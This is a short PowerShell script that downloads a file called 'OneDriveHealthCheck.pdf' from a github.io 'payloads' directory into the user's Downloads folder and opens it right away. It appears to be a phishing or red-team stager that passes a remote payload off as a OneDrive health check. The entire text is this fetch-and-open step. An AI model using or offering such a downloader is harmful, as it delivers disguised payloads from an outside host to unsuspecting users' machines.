# Step 1: Define the URL of the PDF file
$url = "https://itssixtyn3in.github.io/payloads/OneDriveHealthCheck.pdf"

# Step 2: Define the path where you want to save the PDF file
$savePath = "$env:USERPROFILE\Downloads\OneDriveHealthCheck.pdf"

# Step 3: Download the PDF file from the URL and save it to the specified path
Invoke-WebRequest -Uri $url -OutFile $savePath
Start-Process -FilePath "$env:USERPROFILE\Downloads\OneDriveHealthCheck.pdf" -Verb open